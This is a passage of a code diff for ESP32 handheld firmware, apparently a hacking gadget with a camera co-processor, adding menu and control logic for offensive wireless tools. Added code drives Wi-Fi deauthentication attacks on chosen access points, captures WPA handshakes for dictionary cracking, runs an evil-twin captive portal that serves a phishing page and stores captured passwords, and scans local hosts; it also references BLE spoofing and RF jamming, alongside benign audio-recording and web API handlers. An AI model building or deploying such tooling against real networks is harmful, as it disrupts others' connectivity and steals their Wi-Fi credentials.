-  esp_wifi_set_promiscuous(false);
-  WiFi.disconnect(false, false);
-  WiFi.mode(WIFI_OFF);
+  uint8_t atkPayload[10];
+  memset(atkPayload, 0, 10);
+  cameraUartSendPacket(CAM_PKT_DEAUTH_ATK_CMD, atkPayload, 10);
 }
 
 static void bleEnsureInitialized() {
@@ -5519,9 +6417,132 @@ static void uiLoop() {
       exitToUi();
       return;
     }
+    if (btnUp.pressEvent) {
+      cameraCtlFilter = (uint8_t)((cameraCtlFilter + 1) % CAM_FILTER_COUNT);
+      cameraCtlOverlayUntilMs = millis() + 2200;
+      uiPlayMoveTone();
+      if (cameraIsUartMode() && cameraUartEnsureInit()) (void)cameraUartSendControlState();
+      uiMarkDirty();
+    }
+    if (downLongPress()) {
+      cameraModeAction = (cameraModeAction == CAM_MODE_PHOTO) ? CAM_MODE_VIDEO : CAM_MODE_PHOTO;
+      cameraCtlOverlayUntilMs = millis() + 2200;
+      uiPlayMoveTone();
+      uiMarkDirty();
+    }
+    if (downShortClick()) {
+      cameraCtlBrightness++;
+      if (cameraCtlBrightness > 2) cameraCtlBrightness = -2;
+      cameraCtlOverlayUntilMs = millis() + 2200;
+      uiPlayMoveTone();
+      if (cameraIsUartMode() && cameraUartEnsureInit()) (void)cameraUartSendControlState();
+      uiMarkDirty();
+    }
     if (okShortClick()) {
       uiPlayOkTone();
-      cameraCaptureRequest();
+      if (cameraModeAction == CAM_MODE_PHOTO) {
+        cameraCaptureRequest();
+      } else {
+        if (cameraRecordStartPending || cameraRecordStopPending) {
+          cameraToastMessage = "REC busy";
+          cameraToastUntilMs = millis() + 1200;
+          uiMarkDirty();
+          return;
+        }
+        if (cameraRecordActive) cameraRecordStopRequest();
+        else cameraRecordStartRequest();
+      }
+      return;
+    }
+    return;
+  }
+  if (appMode == APP_AUDIO_RECORD) {
+    if (okLongPress()) {
+      uiPlayBackTone();
+      exitToUi();
+      return;
+    }
+    if (btnUp.pressEvent) {
+      uiPlayOkTone();
+      if (cameraIsUartMode() && cameraUartEnsureInit()) {
+        (void)cameraUartSendTimeNow();
+        bool ok = false;
+        if (!cameraAudioRecActive) {
+          ok = cameraUartSendAudioRecord(true);
+          if (ok) {
+            cameraAudioRecActive = true;
+            cameraAudioRecPaused = false;
+            cameraAudioRecSeconds = 0;
+            cameraAudioRecStateText = "Recording";
+            cameraLastError = "Start record...";
+          }
+        } else if (cameraAudioRecPaused) {
+          ok = cameraUartSendAudioResume();
+          if (ok) {
+            cameraAudioRecPaused = false;
+            cameraAudioRecStateText = "Recording";
+            cameraLastError = "Resume record...";
+          }
+        } else {
+          ok = true;
+          cameraLastError = "Already recording";
+        }
+        if (!ok) {
+          cameraLastError = "AUDIO_RESUME_OR_START_FAIL";
+        }
+      } else {
+        cameraLastError = "UART camera only";
+      }
+      uiMarkDirty();
+      return;
+    }
+    if (btnDown.pressEvent) {
+      uiPlayOkTone();
+      if (cameraIsUartMode() && cameraUartEnsureInit()) {
+        if (cameraAudioRecActive && !cameraAudioRecPaused) {
+          if (cameraUartSendAudioPause()) {
+            cameraAudioRecPaused = true;
+            cameraAudioRecStateText = "Paused";
+            cameraLastError = "Pause record...";
+          } else {
+            cameraLastError = "AUDIO_REC_PAUSE_FAIL";
+          }
+        } else {
+          cameraLastError = "Cannot pause";
+        }
+      } else {
+        cameraLastError = "UART camera only";
+      }
+      uiMarkDirty();
+      return;
+    }
+    if (okShortClick()) {
+      uiPlayOkTone();
+      if (cameraIsUartMode() && cameraUartEnsureInit()) {
+        if (cameraAudioRecActive) {
+          if (cameraUartSendAudioRecord(false)) {
+            cameraAudioRecActive = false;
+            cameraAudioRecPaused = false;
+            cameraAudioRecStateText = "Saving";
+            cameraLastError = "Saving to SD...";
+          } else {
+            cameraLastError = "AUDIO_REC_STOP_FAIL";
+          }
+        } else {
+          if (cameraUartSendAudioRecord(true)) {
+            cameraAudioRecActive = true;
+            cameraAudioRecPaused = false;
+            cameraAudioRecSeconds = 0;
+            cameraAudioRecStateText = "Recording";
+            cameraLastError = "Start record...";
+          } else {
+            cameraLastError = "AUDIO_REC_START_FAIL";
+          }
+        }
+      } else {
+        cameraLastError = "UART camera only";
+      }
+      uiMarkDirty();
       return;
     }
     return;
@@ -5601,13 +6622,13 @@ static void uiLoop() {
     uiPlayBackTone();
     if (uiScreen == UI_SET_TFT_BL || uiScreen == UI_SET_MATRIX_BR || uiScreen == UI_SET_UTC_OFFSET) uiEnter(UI_SETTINGS_MENU);
     else if (uiScreen == UI_WIFI_LIST || uiScreen == UI_WIFI_KEYBOARD) uiEnter(UI_SETTINGS_MENU);
-    // Tambahkan navigasi balik untuk fitur Deauth di sini
-    else if (uiScreen == UI_DEAUTH_SCANNER || uiScreen == UI_DEAUTH_REASON_PICKER) uiEnter(UI_TOOLS_MENU); 
+    // Tambahkan navigasi balik untuk fitur Deauth dan Cracker di sini
+    else if (uiScreen == UI_DEAUTH_REASON_PICKER) uiEnter(UI_TOOLS_MENU);
     else if (uiScreen == UI_FILE_EXPLORER || uiScreen == UI_MATRIX_TEXT_MENU || uiScreen == UI_NOTE_EDITOR_MENU || uiScreen == UI_NOTE_EDITOR_MAIN) {
       if (uiScreen == UI_NOTE_EDITOR_MENU || uiScreen == UI_NOTE_EDITOR_MAIN) noteStopPlay();
       uiEnter(UI_TOOLS_MENU);
     }
-    else if (uiScreen == UI_DEAUTH_SCANNER || uiScreen == UI_BLE_SPOOFER || uiScreen == UI_BLE_SCANNER || uiScreen == UI_RF_JAMMER) {
+    else if (uiScreen == UI_DEAUTH_SCANNER || uiScreen == UI_BLE_SPOOFER || uiScreen == UI_BLE_SCANNER || uiScreen == UI_RF_JAMMER || uiScreen == UI_WIFI_CRACKER_SCAN || uiScreen == UI_WIFI_CRACKER_DICT || uiScreen == UI_WIFI_CRACKER_RUN) {
       if (uiScreen == UI_BLE_SPOOFER && bleSpoofingActive) toggleBleSpoofer();
       if (uiScreen == UI_RF_JAMMER && nrfJammingActive) {
         nrfJammingActive = false;
@@ -5618,6 +6639,12 @@ static void uiLoop() {
           nrfRadio.powerUp();
         }
 #endif
+      }
+      if (uiScreen == UI_WIFI_CRACKER_RUN) {
+        uint8_t stp[2] = {0, 0};
+        cameraUartSendPacket(CAM_PKT_CRACK_RUN_START, stp, 2);
+        uint8_t capStop[1] = {0};
+        cameraUartSendPacket(CAM_PKT_CRACK_CAP_START, capStop, 1);
       }
       stopDeauthIfActive();
       uiEnter(UI_TOOLS_MENU);
@@ -5658,7 +6685,7 @@ static void uiLoop() {
     if (btnDown.pressEvent) { mediaMenuIndex = (mediaMenuIndex + 1) % MEDIA_ITEM_COUNT; uiPlayMoveTone(); uiMarkDirty(); }
     if (okShortClick()) {
       uiPlayOkTone();
-        if (mediaMenuIndex == MEDIA_ITEM_BMP) {
+      if (mediaMenuIndex == MEDIA_ITEM_BMP) {
         bmpViewPath = BMP_PATH;
         prevUiScreenBeforeView = uiScreen;
         enterMode(APP_VIEW_BMP);
@@ -5666,6 +6693,8 @@ static void uiLoop() {
         enterMode(APP_VIEW_GIF);
       } else if (mediaMenuIndex == MEDIA_ITEM_CAMERA) {
         enterMode(APP_CAMERA);
+      } else if (mediaMenuIndex == MEDIA_ITEM_RECORD) {
+        enterMode(APP_AUDIO_RECORD);
       }
       return;
     }
@@ -5680,6 +6709,27 @@ static void uiLoop() {
         case SETTING_ITEM_UTC: uiOffsetIdx = utcOffsetIndexFromMinutes(gUtcOffsetMinutes); uiEnter(UI_SET_UTC_OFFSET); return;
         case SETTING_ITEM_WIFI:
           wifiScanAndShowList();
+          return;
+        case SETTING_ITEM_WEBSERVER:
+          if (webServerRunning) {
+            webServerStop();
+          } else {
+            // Turning Matrix webserver on from TFT settings should also start XIAO web.
+            xiaoWebServerEnabled = true;
+            (void)webServerStart();
+          }
+          uiMarkDirty();
+          return;
+        case SETTING_ITEM_XIAO_WEBSERVER:
+          xiaoWebServerEnabled = !xiaoWebServerEnabled;
+          if (appMode == APP_CAMERA) xiaoWebServerEnabled = false;
+          if (cameraIsUartMode() && cameraUartEnsureInit()) {
+            if (xiaoWebServerEnabled && webServerRunning && appMode != APP_CAMERA) {
+              cameraUartSyncXiaoNetworkConfig();
+            }
+            (void)cameraUartSendWebServerState(xiaoWebServerEnabled && webServerRunning && appMode != APP_CAMERA);
+          }
+          uiMarkDirty();
           return;
         case SETTING_ITEM_IMU:
           QMI8658_SetEnabled(!imuOn);
@@ -5854,6 +6904,21 @@ static void uiLoop() {
       else if (toolsMenuIndex == TOOLS_ITEM_RF_JAMMER) {
         uiEnter(UI_RF_JAMMER);
       }
+      else if (toolsMenuIndex == TOOLS_ITEM_WIFI_CRACK) {
+        startWifiCrackerScan();
+      }
+      else if (toolsMenuIndex == TOOLS_ITEM_NET_PROBE) {
+        // Init state for IP Scanning
+        ipScanActive = false;
+        ipScanProgress = 0;
+        ipScanFoundCount = 0;
+        ipScanTargetIP = "Start Scan?";
+        // Change UI state
+        // We will create UI_IP_SCANNING below
+        uiEnter(UI_IP_SCANNING);
+      } else if (toolsMenuIndex == TOOLS_ITEM_EVIL_TWIN) {
+        startEvilTwinScan();
+      }
       return;
     }
   } else if (uiScreen == UI_MATRIX_TEXT_MENU) {
@@ -5940,8 +7005,8 @@ static void uiLoop() {
       return;
     }
   } else if (uiScreen == UI_FILE_ACTION) {
-    if (btnUp.pressEvent) { uiIndex = (uiIndex == 0) ? 2 : (uiIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
-    if (btnDown.pressEvent) { uiIndex = (uiIndex + 1) % 3; uiPlayMoveTone(); uiMarkDirty(); }
+    if (btnUp.pressEvent) { uiIndex = (uiIndex == 0) ? 3 : (uiIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
+    if (btnDown.pressEvent) { uiIndex = (uiIndex + 1) % 4; uiPlayMoveTone(); uiMarkDirty(); }
     if (okShortClick()) {
       uiPlayOkTone();
       if (uiIndex == 1) { // View
@@ -5961,6 +7026,16 @@ static void uiLoop() {
       } else if (uiIndex == 2) { // Delete
         LittleFS.remove(explorerFileNames[explorerListIndex]);
         explorerRefresh();
+      } else if (uiIndex == 3) { // Send->XIAO
+        String p = explorerFileNames[explorerListIndex];
+        String pl = p;
+        pl.toLowerCase();
+        if (pl.endsWith(".jpg") || pl.endsWith(".jpeg") || pl.endsWith(".bmp") || pl.endsWith(".png") || pl.endsWith(".gif")) {
+          if (cameraUartSendJpgToXiao(p)) cameraLastError = "Send file OK";
+          else cameraLastError = "Send file fail";
+        } else {
+          cameraLastError = "Only image file";
+        }
       }
       uiEnter(UI_FILE_EXPLORER);
       return;
@@ -6059,6 +7134,31 @@ static void uiLoop() {
       uiMarkDirty();
       return;
     }
+  } else if (uiScreen == UI_WIFI_CRACKER_SCAN) {
+    uint8_t itemCount = wifiScanCount + 1;
+    if (btnUp.pressEvent) { wifiListIndex = (wifiListIndex == 0) ? (itemCount - 1) : (wifiListIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
+    if (btnDown.pressEvent) { wifiListIndex = (wifiListIndex + 1) % itemCount; uiPlayMoveTone(); uiMarkDirty(); }
+    if (okShortClick()) {
+      uiPlayOkTone();
+      if (wifiListIndex >= wifiScanCount) {
+        startWifiCrackerScan();
+        return;
+      }
+      deauthTargetSsid = wifiScanSsids[wifiListIndex];
+      deauthTargetChannel = deauthScanChannels[wifiListIndex];
+      memcpy(deauthTargetBssid, deauthScanBssids[wifiListIndex], 6);
+      
+      // NEXT STEP: Show dictionary picker from SD card
+      crackerDictCount = 0;
+      crackerDictIndex = 0;
+      for (uint8_t i = 0; i < CRACKER_DICT_MAX; i++) crackerDictFiles[i] = "";
+      crackerDictReqRetry = 0;
+      crackerDictReqDone = false;
+      crackerDictReqLastMs = millis();
+      uint8_t dummyreq = 1;
+      cameraUartSendPacket(CAM_PKT_CRACK_DICT_REQ, &dummyreq, 1);
+      uiEnter(UI_WIFI_CRACKER_DICT);
+    }
   } else if (uiScreen == UI_DEAUTH_SCANNER) {
     uint8_t itemCount = wifiScanCount + 1;
     if (btnUp.pressEvent) { wifiListIndex = (wifiListIndex == 0) ? (itemCount - 1) : (wifiListIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
@@ -6077,6 +7177,87 @@ static void uiLoop() {
       uiEnter(UI_DEAUTH_REASON_PICKER);
     }
   } 
+  else if (uiScreen == UI_WIFI_CRACKER_DICT) {
+    if (!crackerDictReqDone && crackerDictReqRetry < 4 && (millis() - crackerDictReqLastMs) > 1400) {
+      uint8_t dummyreq = 1;
+      cameraUartSendPacket(CAM_PKT_CRACK_DICT_REQ, &dummyreq, 1);
+      crackerDictReqLastMs = millis();
+      crackerDictReqRetry++;
+      uiMarkDirty();
+    }
+
+    if (btnUp.pressEvent) {
+      if (crackerDictCount > 0) {
+        crackerDictIndex = (crackerDictIndex == 0) ? (crackerDictCount - 1) : (crackerDictIndex - 1);
+      }
+      uiPlayMoveTone();
+      uiMarkDirty();
+    }
+    static bool _upLongLast = false;
+    bool _upLongNow = btnUp.longFired && btnUp.stable;
+    if (_upLongNow && !_upLongLast) { // Toggle PCAP status via Long press UP
+       crackerSavePcap = !crackerSavePcap;
+       uiPlayOkTone();
+       uiMarkDirty();
+    }
+    _upLongLast = _upLongNow;
+
+    if (btnDown.pressEvent) {
+      if (crackerDictCount > 0) {
+        crackerDictIndex = (crackerDictIndex + 1) % crackerDictCount;
+      }
+      uiPlayMoveTone();
+      uiMarkDirty();
+    }
+    if (okShortClick()) {
+      uiPlayOkTone();
+      if (crackerDictCount > 0 && crackerDictIndex < crackerDictCount) {
+        strncpy(crackerSelectedDict, crackerDictFiles[crackerDictIndex].c_str(), sizeof(crackerSelectedDict) - 1);
+        crackerSelectedDict[sizeof(crackerSelectedDict) - 1] = '\0';
+        crackerDone = 0;
+        crackerHandshakeFound = 0;
+        crackerHashTested = 0;
+        crackerPassword = "";
+        crackerCaptureStage = "INIT";
+        crackerCaptureMetrics = "Starting monitor...";
+        
+        uint8_t slen = deauthTargetSsid.length();
+        if (slen > 32) slen = 32;
+        
+        uint8_t pkt[42];
+        memset(pkt, 0, 42);
+        pkt[0] = 1;
+        memcpy(&pkt[1], deauthTargetBssid, 6);
+        pkt[7] = deauthTargetChannel;
+        pkt[8] = slen;
+        memcpy(&pkt[9], deauthTargetSsid.c_str(), slen);
+        pkt[9 + slen] = crackerSavePcap ? 1 : 0;
+
+        cameraUartSendPacket(CAM_PKT_CRACK_CAP_START, pkt, 10 + slen);
+        uiEnter(UI_WIFI_CRACKER_RUN);
+      }
+    }
+  }
+  else if (uiScreen == UI_WIFI_CRACKER_RUN) {
+    if (okShortClick()) {
+      if (crackerHandshakeFound && !crackerDone && crackerHashTested == 0) {
+        uint8_t capStop[1] = {0};
+        cameraUartSendPacket(CAM_PKT_CRACK_CAP_START, capStop, 1);
+        // Send command to start Dictionary Attack
+        uint8_t pkt[130];
+        memset(pkt, 0, sizeof(pkt));
+        pkt[0] = 1; // 1 = Start
+        size_t dictLen = strlen(crackerSelectedDict);
+        if (dictLen > (sizeof(pkt) - 1)) dictLen = sizeof(pkt) - 1;
+        memcpy(&pkt[1], crackerSelectedDict, dictLen);
+        cameraUartSendPacket(CAM_PKT_CRACK_RUN_START, pkt, 1 + (uint16_t)dictLen);
+        uiPlayOkTone();
+        // Give it a fake tiny hash test number so user can't send again immediately
+        crackerHashTested = 1;
+        uiMarkDirty();
+      }
+    }
+  }
   else if (uiScreen == UI_DEAUTH_REASON_PICKER) {
     if (btnUp.pressEvent) { 
       reasonListIndex = (reasonListIndex == 0) ? (deauthReasonCount - 1) : (reasonListIndex - 1);
@@ -6091,13 +7272,16 @@ static void uiLoop() {
     if (okShortClick()) {
       selectedReason = deauthReasonList[reasonListIndex].code;
       uiPlayOkTone();
-      WiFi.mode(WIFI_STA);
-      WiFi.disconnect(true);
-      wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
-      esp_wifi_set_promiscuous_filter(&filt);
-      esp_wifi_set_promiscuous(true); // Promiscuous mode to allow arbitrary injection and channel changes
-      esp_wifi_set_promiscuous_rx_cb(&deauthSniffer);
-      esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);
+      
+      // Request XIAO to start Deauth
+      uint8_t atkPayload[10];
+      memcpy(&atkPayload[0], deauthTargetBssid, 6);
+      atkPayload[6] = (uint8_t)deauthTargetChannel;
+      atkPayload[7] = (uint8_t)(selectedReason & 0xFF);
+      atkPayload[8] = (uint8_t)((selectedReason >> 8) & 0xFF);
+      atkPayload[9] = 1; // 1 = start
+      cameraUartSendPacket(CAM_PKT_DEAUTH_ATK_CMD, atkPayload, 10);
+
       deauthKilling = true;
       deauthPacketsSent = 0;
       lastDeauthSentMs = millis();
@@ -6107,10 +7291,11 @@ static void uiLoop() {
     if (okShortClick() || okLongPress()) {
       uiPlayOkTone();
       deauthKilling = false;
-      esp_wifi_set_promiscuous_rx_cb(NULL);
-      esp_wifi_set_promiscuous(false);
-      WiFi.disconnect(false, false);
-      WiFi.mode(WIFI_OFF);
+      
+      uint8_t atkPayload[10];
+      memset(atkPayload, 0, 10); // 9th byte is 0 = stop
+      cameraUartSendPacket(CAM_PKT_DEAUTH_ATK_CMD, atkPayload, 10);
+
       uiEnter(UI_TOOLS_MENU);
     }
   } else if (uiScreen == UI_BLE_SPOOFER) {
@@ -6247,6 +7432,84 @@ static void uiLoop() {
     if (btnUp.pressEvent) { uiOffsetIdx = utcOffsetNextIndex(uiOffsetIdx, +1); uiPlayMoveTone(); uiMarkDirty(); }
     if (btnDown.pressEvent) { uiOffsetIdx = utcOffsetNextIndex(uiOffsetIdx, -1); uiPlayMoveTone(); uiMarkDirty(); }
     if (okShortClick()) { uiPlayOkTone(); gUtcOffsetMinutes = (int)kUtcOffsetsMin[uiOffsetIdx]; timeApplyTZ(); timeSynced = false; (void)utcOffsetSaveToFS(); uiEnter(UI_SETTINGS_MENU); }
+  } else if (uiScreen == UI_IP_SCANNING) {
+    if (btnUp.pressEvent || btnDown.pressEvent) { 
+        if (!ipScanActive) { ipScanModePort = !ipScanModePort; } 
+        uiPlayMoveTone(); 
+        uiMarkDirty(); 
+    }
+    if (okShortClick()) {
+      uiPlayOkTone();
+      ipScanActive = !ipScanActive;
+      if (ipScanActive) {
+        ipScanFoundCount = 0;
+        ipScanCurrentSuffix = 1;
+        ipScanLastPingMs = 0;
+        if (WiFi.status() == WL_CONNECTED) {
+          ipScanTargetIP = "Starting...";
+        } else {
+          ipScanActive = false;
+          ipScanTargetIP = "WIFI DISCONNECTED";
+        }
+      } else {
+        ipScanTargetIP = "Stopped";
+      }
+      uiMarkDirty();
+    }
+    if (okLongPress()) {
+      uiPlayMoveTone();
+      uiEnter(UI_TOOLS_MENU);
+      uiMarkDirty();
+    }
+  } else if (uiScreen == UI_EVIL_TWIN_SCAN) {
+    if (btnUp.pressEvent) {
+      if (wifiScanCount > 0) {
+        if (wifiListIndex == 0) wifiListIndex = wifiScanCount;
+        else wifiListIndex--;
+        uiPlayMoveTone();
+        uiMarkDirty();
+      }
+    }
+    if (btnDown.pressEvent) {
+      if (wifiScanCount > 0) {
+        wifiListIndex = (wifiListIndex + 1) % (wifiScanCount + 1);
+        uiPlayMoveTone();
+        uiMarkDirty();
+      }
+    }
+    if (okShortClick()) {
+      uiPlayOkTone();
+      if (wifiListIndex == wifiScanCount) {
+        startEvilTwinScan();
+      } else {
+        if (wifiScanCount > 0) {
+          evilTwinTargetSsid = wifiScanSsids[wifiListIndex];
+          evilTwinState = EVIL_TWIN_PULLING;
+          evilTwinCapturedCount = 0;
+          for(int p=0; p<MAX_EVIL_TWIN_PASSWORDS; p++) evilTwinCapturedPwds[p]="";
+          evilTwinFile = LittleFS.open("/phish.html", "w");
+          evilTwinFile.close(); // just to wipe it
+          String pullName = "/htdocs/index.html";
+          cameraUartSendPacket(CAM_PKT_FILE_PULL_REQ, (const uint8_t*)pullName.c_str(), pullName.length());
+          
+          evilTwinStatusMsg = "Checking SD Card...";
+          uiEnter(UI_EVIL_TWIN_RUN);
+        }
+      }
+      uiMarkDirty();
+    }
+    if (okLongPress()) {
+      uiPlayMoveTone();
+      uiEnter(UI_TOOLS_MENU);
+      uiMarkDirty();
+    }
+  } else if (uiScreen == UI_EVIL_TWIN_RUN) {
+    if (okShortClick() || okLongPress()) {
+      uiPlayOkTone();
+      stopMatrixCaptivePortal();
+      uiEnter(UI_TOOLS_MENU);
+      uiMarkDirty();
+    }
   }
   if (!tftSleeping && uiDirty) {
     uiDirty = false;
@@ -6258,6 +7521,9 @@ static void uiLoop() {
     else if (uiScreen == UI_SONG_MENU) tftDrawSongMenu();
     else if (uiScreen == UI_TOOLS_MENU) tftDrawToolsMenu();
     else if (uiScreen == UI_DEAUTH_SCANNER) tftDrawDeauthScanner();
+    else if (uiScreen == UI_WIFI_CRACKER_SCAN) tftDrawWifiCrackerScanner();
+    else if (uiScreen == UI_WIFI_CRACKER_DICT) tftDrawWifiCrackerDict();
+    else if (uiScreen == UI_WIFI_CRACKER_RUN) tftDrawWifiCrackerRun();
     else if (uiScreen == UI_FILE_EXPLORER) tftDrawFileExplorer();
     else if (uiScreen == UI_FILE_ACTION) tftDrawFileAction();
     else if (uiScreen == UI_FILE_VIEWER) tftDrawFileViewer();
@@ -6277,7 +7543,9 @@ static void uiLoop() {
     else if (uiScreen == UI_BLE_SPOOFER) tftDrawBleSpoofer();
     else if (uiScreen == UI_BLE_SCANNER) tftDrawBleList("BLE Monitor");
     else if (uiScreen == UI_RF_JAMMER) tftDrawRfJammer();
-    else if (uiScreen == UI_TOOL_CALC) tftDrawCalcTool();
+    else if (uiScreen == UI_IP_SCANNING) tftDrawIpScanning();
+    else if (uiScreen == UI_EVIL_TWIN_SCAN) tftDrawEvilTwinScan();
+    else if (uiScreen == UI_EVIL_TWIN_RUN) tftDrawEvilTwinRun();
   }
 }
 
@@ -6343,6 +7611,46 @@ static void wifiAutoConfig() {
   WiFi.mode(WIFI_OFF);
 }
 
+static void ipScanningTick() {
+  if (!ipScanActive) return;
+  if (WiFi.status() != WL_CONNECTED) {
+    ipScanTargetIP = "Disconnected";
+    ipScanActive = false;
+    if (uiScreen == UI_IP_SCANNING) uiMarkDirty();
+    return;
+  }
+  uint32_t now = millis();
+  if (now - ipScanLastPingMs >= 200) { // Limit strict menjadi rata-rata max 5 IP per detik (1000/5 = 200ms)
+    if (ipScanCurrentSuffix < 255) {
+      IPAddress base = WiFi.gatewayIP();
+      IPAddress targetIP(base[0], base[1], base[2], ipScanCurrentSuffix);
+      int res = 0;
+      if (targetIP != WiFi.localIP()) {
+        ipScanTargetIP = targetIP.toString();
+        if (ipScanModePort) {
+            res = ipScanClient.connect(targetIP, 80, 50) ? 1 : 0;
+            ipScanClient.stop();
+        } else {
+            res = netProbePing(targetIP) ? 1 : 0;
+        }
+
+        if (res != 0 && ipScanFoundCount < 20) {
+          ipScanFoundIPs[ipScanFoundCount++] = targetIP.toString();
+        }
+      }
+      ipScanCurrentSuffix++;
+      ipScanProgress = (uint8_t)(((float)ipScanCurrentSuffix / 254.0) * 100.0);
+      if (uiScreen == UI_IP_SCANNING && ((ipScanCurrentSuffix % 10 == 0) || res != 0)) uiMarkDirty();
+      ipScanLastPingMs = millis(); // <--- Pastikan Idle task bisa bernafas
+    } else {
+      ipScanActive = false;
+      ipScanTargetIP = "Done";
+      ipScanProgress = 100;
+      if (uiScreen == UI_IP_SCANNING) uiMarkDirty();
+    }
+  }
+}
+
 static void wifiAutoConnectTick() {
   if (!wifiAutoConnectPending) return;
   if (deauthKilling || bleSessionActive) return;
@@ -6382,7 +7690,7 @@ static void handleStatus() {
   String json = "{";
   json += "\"ip\":\"" + WiFi.localIP().toString() + "\",";
   json += "\"ssid\":\"" + jsonEscape(WiFi.SSID()) + "\",";
-  json += "\"mode\":\"" + String(appMode == APP_UI ? "ui" : (appMode == APP_VIEW_BMP ? "image" : (appMode == APP_VIEW_GIF ? "gif" : (appMode == APP_CAMERA ? "cam" : "game")))) + "\",";
+  json += "\"mode\":\"" + String(appMode == APP_UI ? "ui" : (appMode == APP_VIEW_BMP ? "image" : (appMode == APP_VIEW_GIF ? "gif" : (appMode == APP_CAMERA ? "cam" : (appMode == APP_AUDIO_RECORD ? "record" : "game"))))) + "\",";
   json += "\"tftSleeping\":" + String(tftSleeping ? "true" : "false") + ",";
   json += "\"tftBacklight\":" + String(gTftBacklight) + ",";
   json += "\"gif\":{\"playing\":" + String(gifPlaying ? "true" : "false") + "},";
@@ -6400,6 +7708,10 @@ static void handleStatus() {
   json += "\"cam\":{";
   json += "\"connected\":" + String(cameraStreamReady ? "true" : "false") + ",";
   json += "\"url\":\"" + jsonEscape(cameraUrl) + "\",";
+  json += "\"xiaoWebEnabled\":" + String(xiaoWebServerEnabled ? "true" : "false") + ",";
+  bool xiaoWebRunning = xiaoWebServerEnabled && webServerRunning && appMode != APP_CAMERA;
+  json += "\"xiaoWebRunning\":" + String(xiaoWebRunning ? "true" : "false") + ",";
+  json += "\"xiaoWebUrl\":\"" + jsonEscape(xiaoWebUrl) + "\",";
   json += "\"lastError\":\"" + jsonEscape(cameraLastError) + "\"";
   json += "}";
   json += "}";
@@ -6413,6 +7725,7 @@ static void handleModeApi() {
   else if (s == "image") enterMode(APP_VIEW_BMP);
   else if (s == "gif") enterMode(APP_VIEW_GIF);
   else if (s == "cam") enterMode(APP_CAMERA);
+  else if (s == "record") enterMode(APP_AUDIO_RECORD);
   else if (s == "game") gameEnterMenu();
   else { server.send(400, "text/plain", "bad"); return; }
   server.send(200, "text/plain", "OK");
@@ -6564,6 +7877,135 @@ static void handleCameraCaptureApi() {
   server.send(200, "text/plain", "OK");
 }
 
+static void handleCameraRecordApi() {
+  if (appMode != APP_CAMERA) {
+    server.send(409, "text/plain", "NOT_IN_CAMERA_MODE");
+    return;
+  }
+  if (!server.hasArg("set")) {
+    server.send(400, "text/plain", "?set=start|stop");
+    return;
+  }
+  String set = server.arg("set");
+  set.toLowerCase();
+  if (set == "start") {
+    cameraRecordStartRequest();
+    server.send(200, "text/plain", "REC_START_REQUESTED");
+    return;
+  }
+  if (set == "stop") {
+    cameraRecordStopRequest();
+    server.send(200, "text/plain", "REC_STOP_REQUESTED");
+    return;
+  }
+  server.send(400, "text/plain", "bad");
+}
+
+static void handleCameraSdListApi() {
+  if (server.hasArg("refresh") && server.arg("refresh") == "1") {
+    bool ok = cameraFetchSdListSync(2200);
+    if (!ok && cameraLastError.length() == 0) cameraLastError = "SD list request timeout";
+  }
+
+  // Pump UART parser briefly here so Gallery requests can progress even
+  // when APP_CAMERA is not currently active on the TFT.
+  if (cameraIsUartMode() && (cameraSdListLoading || cameraSdListPending)) {
+    bool savedTftDirty = tftDirty;
+    tftDirty = false;
+    uint32_t endAt = millis() + 180;
+    while ((int32_t)(endAt - millis()) > 0) {
+      cameraLoopUart();
+      if (!cameraSdListLoading && !cameraSdListPending) break;
+      delay(2);
+    }
+    tftDirty = savedTftDirty;
+  }
+
+  if (cameraSdListLoading && cameraSdListRequestMs > 0 && (int32_t)(millis() - (cameraSdListRequestMs + 6000)) > 0) {
+    cameraSdListLoading = false;
+    if (cameraSdListCache.length() == 0) cameraSdListCache = "SD list timeout";
+  }
+
+  String payload = "{\"recording\":";
+  payload += (cameraRecordActive ? "true" : "false");
+  payload += ",\"loading\":";
+  payload += (cameraSdListLoading ? "true" : "false");
+  payload += ",\"updatedMs\":";
+  payload += String(cameraSdListLastUpdateMs);
+  payload += ",\"status\":";
+  payload += "\"" + jsonEscape(cameraLastError) + "\"";
+  payload += ",\"list\":";
+  payload += "\"" + jsonEscape(cameraSdListCache) + "\"}";
+  server.send(200, "application/json", payload);
+}
+
+static void handleCameraXiaoWebApi() {
+  if (!cameraIsUartMode()) {
+    server.send(409, "text/plain", "UART camera only");
+    return;
+  }
+  if (!server.hasArg("set")) {
+    server.send(400, "text/plain", "?set=on|off|toggle");
+    return;
+  }
+
+  String set = server.arg("set");
+  set.toLowerCase();
+  if (set == "on") xiaoWebServerEnabled = true;
+  else if (set == "off") xiaoWebServerEnabled = false;
+  else if (set == "toggle") xiaoWebServerEnabled = !xiaoWebServerEnabled;
+  else {
+    server.send(400, "text/plain", "bad");
+    return;
+  }
+
+  if (appMode == APP_CAMERA) {
+    xiaoWebServerEnabled = false;
+  }
+
+  if (cameraUartEnsureInit()) {
+    if (xiaoWebServerEnabled && webServerRunning && appMode != APP_CAMERA) {
+      cameraUartSyncXiaoNetworkConfig();
+    }
+    (void)cameraUartSendWebServerState(xiaoWebServerEnabled && webServerRunning && appMode != APP_CAMERA);
+  }
+
+  String out = String("{") +
+               "\"enabled\":" + (xiaoWebServerEnabled ? "true" : "false") + "," +
+               "\"running\":" + ((xiaoWebServerEnabled && webServerRunning && appMode != APP_CAMERA) ? "true" : "false") +
+               "}";
+  server.send(200, "application/json", out);
+}
+
+static void handleCameraAudioRecordApi() {
+  if (!cameraIsUartMode()) {
+    server.send(409, "text/plain", "UART camera only");
+    return;
+  }
+  if (!server.hasArg("set")) {
+    server.send(400, "text/plain", "?set=start|stop");
+    return;
+  }
+  String set = server.arg("set");
+  set.toLowerCase();
+  if (!cameraUartEnsureInit()) {
+    server.send(500, "text/plain", "UART init failed");
+    return;
+  }
+  (void)cameraUartSendTimeNow();
+  if (set == "start") {
+    bool ok = cameraUartSendAudioRecord(true);
+    server.send(ok ? 200 : 500, "text/plain", ok ? "AUDIO_REC_START" : "AUDIO_REC_START_FAIL");
+    return;
+  }
+  if (set == "stop") {
+    bool ok = cameraUartSendAudioRecord(false);
